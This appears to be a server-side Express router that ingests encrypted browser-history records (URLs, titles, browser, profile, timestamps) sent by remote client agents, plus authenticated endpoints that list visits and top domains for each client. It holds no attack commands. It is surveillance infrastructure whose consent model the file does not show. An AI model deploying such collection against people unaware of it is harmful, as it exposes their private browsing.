import { Router } from "express";
import { decryptAes256CbcPrefixedIv } from "../encryption";
import { getClient, saveClient } from "../store";
import { getSenderClientId } from "../clientId";
import { getKeysToTry } from "../keyring";
import { prisma } from "../prisma";
import { requireAuth } from "../middleware/auth";

const router = Router();

type RawVisit = {
  Url?: string;
  url?: string;
  Title?: string;
  title?: string;
  Browser?: string;
  browser?: string;
  Profile?: string;
  profile?: string;
  VisitedAtUtc?: string;
  visitedAtUtc?: string;
};

function extractDomain(rawUrl: string): string {
  try {
    return new URL(rawUrl).hostname.toLowerCase();
  } catch {
    return "";
  }
}

function toDate(raw: unknown): Date | null {
  const s = String(raw || "").trim();
  if (!s) return null;
  const d = new Date(s);
  return Number.isNaN(d.getTime()) ? null : d;
}

router.post("/", async (req, res) => {
  try {
    const clientId = getSenderClientId(req);
    const client = await getClient(clientId);
    const keysToTry = getKeysToTry(client?.encryptionKey);

    const encrypted: Buffer = Buffer.isBuffer(req.body)
      ? (req.body as Buffer)
      : Buffer.from([]);
    if (encrypted.length < 17) {
      return res.status(400).json({ message: "Empty payload" });
    }

    let json = "";
    let usedKey = "";
    for (const key of keysToTry) {
      try {
        json = decryptAes256CbcPrefixedIv(encrypted, key).toString("utf-8");
        JSON.parse(json);
        usedKey = key;
        break;
      } catch {
        continue;
      }
    }

    const now = new Date();
    if (!usedKey) {
      if (!client) {
        await saveClient({ id: clientId, createdAt: now, lastSeen: now });
      } else {
        await saveClient({ id: clientId, lastSeen: now });
      }
      return res.status(400).json({ message: "Decryption failed" });
    }

    if (!client) {
      await saveClient({
        id: clientId,
        encryptionKey: usedKey,
        createdAt: now,
        lastSeen: now,
      });
    } else if (client.encryptionKey !== usedKey) {
      await saveClient({ id: clientId, encryptionKey: usedKey, lastSeen: now });
    } else {
      await saveClient({ id: clientId, lastSeen: now });
    }

    const payload = JSON.parse(json);
    const visits: RawVisit[] = Array.isArray(payload)
      ? payload
      : Array.isArray(payload?.visits)
        ? payload.visits
        : [];

    const rows = visits
      .map((v) => {
        const url = String(v.Url || v.url || "").trim();
        if (!url) return null;
        const visitedAt = toDate(v.VisitedAtUtc || v.visitedAtUtc);
        if (!visitedAt) return null;
        const browser = String(v.Browser || v.browser || "unknown").toLowerCase();
        const profile = String(v.Profile || v.profile || "").trim() || null;
        const title = String(v.Title || v.title || "").trim() || null;
        const domain = extractDomain(url);
        if (!domain) return null;
        return { clientId, url, domain, title, browser, profile, visitedAt };
      })
      .filter((x): x is NonNullable<typeof x> => x !== null);

    if (rows.length === 0) {
      return res.json({ ok: true, inserted: 0 });
    }

    // Dedup is enforced by the functional unique index on md5(url) — but Prisma
    // can't address a functional index from `skipDuplicates`. Insert one row at
    // a time and swallow unique-constraint errors so a single duplicate doesn't
    // poison the whole batch.
    let inserted = 0;
    for (const data of rows) {
      try {
        await prisma.browserActivity.create({ data });
        inserted += 1;
      } catch (err: any) {
        if (err?.code === "P2002") continue; // duplicate — expected, ignore
        throw err;
      }
    }

    return res.json({ ok: true, inserted });
  } catch (e) {
    console.error("[browser-activity] ingest failed", e);
    res.status(500).json({ message: "Failed to ingest browser activity" });
  }
});

router.get("/", requireAuth, async (req, res) => {
  try {
    const clientId = String(req.query.clientId || "").trim();
    if (!clientId) return res.status(400).json({ message: "clientId required" });
    const limit = Math.min(parseInt(String(req.query.limit || "200"), 10) || 200, 1000);
    const browser = String(req.query.browser || "").trim();
    const where: any = { clientId };
    if (browser) where.browser = browser.toLowerCase();
    const rows = await prisma.browserActivity.findMany({
      where,
      orderBy: { visitedAt: "desc" },
      take: limit,
    });
    return res.json({ data: rows, total: rows.length });
  } catch (e) {
    console.error("[browser-activity] list failed", e);
    res.status(500).json({ message: "Failed to load browser activity" });
  }
});

router.get("/top-domains", requireAuth, async (req, res) => {
  try {
    const clientId = String(req.query.clientId || "").trim();
    if (!clientId) return res.status(400).json({ message: "clientId required" });
    const limit = Math.min(parseInt(String(req.query.limit || "10"), 10) || 10, 50);
    const grouped = await prisma.browserActivity.groupBy({
      by: ["domain"],
      where: { clientId },
      _count: { _all: true },
      orderBy: { _count: { domain: "desc" } },
      take: limit,
    });
    return res.json({
      data: grouped.map((g) => ({ domain: g.domain, count: g._count._all })),
    });
  } catch (e) {
    console.error("[browser-activity] top-domains failed", e);
    res.status(500).json({ message: "Failed" });
  }
});

export default router;
